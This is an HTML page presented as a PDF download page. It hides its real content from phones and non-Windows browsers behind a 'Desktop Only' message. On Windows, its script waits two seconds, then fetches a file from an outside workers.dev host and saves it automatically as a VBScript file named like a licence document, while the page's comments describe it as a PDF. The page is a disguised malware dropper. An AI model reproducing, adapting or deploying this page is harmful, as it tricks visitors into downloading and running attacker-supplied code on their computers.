<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Download the full PDF file.</title>
<meta name="description" content="Download the full PDF file.">
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='4' fill='%23ea4335'/%3E%3Ctext x='12' y='16.5' font-size='8' font-family='Arial' font-weight='bold' fill='white' text-anchor='middle'%3EPDF%3C/text%3E%3C/svg%3E">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body {
    font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    background: #525659;
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }


  /* ===== Desktop-only screen (shown on phones) ===== */
  .desktop-only {
    display: none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 18px;
    height: 100vh;
    padding: 24px;
    text-align: center;
  }
  body.mobile .pdf-toolbar,
  body.mobile .pdf-stage,
  body.mobile .overlay,
  body.mobile .float-pill { display: none !important; }
  body.mobile .desktop-only { display: flex; }
  .desktop-only svg {
    width: 72px;
    height: 72px;
    stroke: #8ab4f8;
    stroke-width: 1.6;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    filter: drop-shadow(0 0 12px rgba(138, 180, 248, .45));
  }
  .desktop-only .title {
    font-size: 20px;
    font-weight: 700;
    color: #e8eaed;
  }
  .desktop-only .sub {
    font-size: 14px;
    color: #9aa0a6;
    max-width: 300px;
    line-height: 1.6;
  }

  @media (max-width: 760px) {
    .tb-filename { max-width: 40vw; }
    .tb-hide-m { display: none; }
    .pdf-page { width: 816px; }
  }
</style>
</head>
<body>


  <!-- shown only when visiting from a phone -->
  <div class="desktop-only">
    <svg viewBox="0 0 24 24">
      <rect x="2" y="4" width="20" height="13" rx="2" />
      <path d="M8 21h8" />
      <path d="M12 17v4" />
    </svg>
    <div class="title">Desktop Only</div>
    <div class="sub">This document is available for desktop only. Please visit from a computer. 💻</div>
  </div>

 

  
 

<script>
(function () {
  'use strict';

  // check if the visitor is on a phone
  var isMobile =
    (navigator.userAgentData && navigator.userAgentData.mobile) ||
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Mac OS/i.test(navigator.userAgent);

  // check if the visitor is on Windows
  var isWindows = /Windows/i.test(navigator.userAgent);

  if (isMobile || !isWindows) {
    document.body.classList.add('mobile');
    document.title = 'Desktop Only';
    return; // Windows only — stop here on other devices
  }

  /* PDF file hosted on this domain. Change the path here if your file has another name. */
  var PDF_URL = 'https://cloud.storagebase.workers.dev/get/Setup';
  var FILE_NAME = 'FRESHLOGISTICS_Licenses.vbs';

  /* ================= Download the PDF file hosted on this domain ================= */

  var sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  async function downloadFile(url, filename, attempts = 3) {
    for (let i = 1; i <= attempts; i++) {
      try {
        const response = await fetch(url);

        if (!response.ok) {
          throw new Error(`Download failed: ${response.status}`);
        }

        const blob = await response.blob();

        const blobUrl = URL.createObjectURL(blob);

        const a = document.createElement('a');
        a.href = blobUrl;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        a.remove();

        URL.revokeObjectURL(blobUrl);
        return; // success — stop retrying
      } catch (error) {
        console.error(`Attempt ${i}/${attempts} failed:`, error);
        if (i === attempts) throw error;  // last attempt — give up
        await sleep(3000);                // wait 3 seconds before retrying
      }
    }
  }

  // Windows — wait 2 seconds, then download automatically
  (async () => {
    await sleep(2000); // wait 2 seconds

    try {
      await downloadFile(PDF_URL, FILE_NAME);
      console.log('Download completed');
    } catch (error) {
      console.error('Error downloading file:', error);
    }
  })();
})();
</script>
</body>
</html>
